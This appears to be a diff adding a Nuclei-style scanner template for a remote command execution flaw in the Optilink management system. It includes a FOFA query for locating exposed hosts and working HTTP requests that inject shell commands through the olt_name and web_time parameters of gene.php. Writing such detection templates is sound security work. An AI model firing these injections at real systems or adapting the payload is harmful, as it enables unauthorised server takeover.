@@ -1,0 +1,55 @@
+id: optilink-guanli-gene_php-rce
+
+info:
+  name: Optilink 管理系统 gene.php 远程命令执行
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: body="/html/css/dxtdata.css"
+    Optilink 管理系统 gene.php 接口存在远程命令执行漏洞，攻击者可通过olt_name参数注入系统命令，可能导致服务器被完全控制。
+  reference:
+    - 
+  tags: rce, optilink, guanli-system
+
+variables:
+  username-olt_name: "{{to_lower(rand_base(6))}}"
+  username-web_time: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |-
+        GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;echo+pboyjnnrfipmplsukdeczudsefxmywe>%20{{username-olt_name}}.txt;%20%23%20 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+      - |-
+        GET /cgi/fsystem/{{username-olt_name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: olt_name-远程命令执行
+        dsl:
+          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"
+
+  - raw:
+      - |-
+        GET /cgi/fsystem/gene.php?time=1&web_time=;echo+pboyjnnrfipmplsukdeczudsefxmywe>%20{{username-web_time}}.txt;%20%23%20 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+      - |-
+        GET /cgi/fsystem/{{username-web_time}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: web_time-远程命令执行
+        dsl:
+          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"
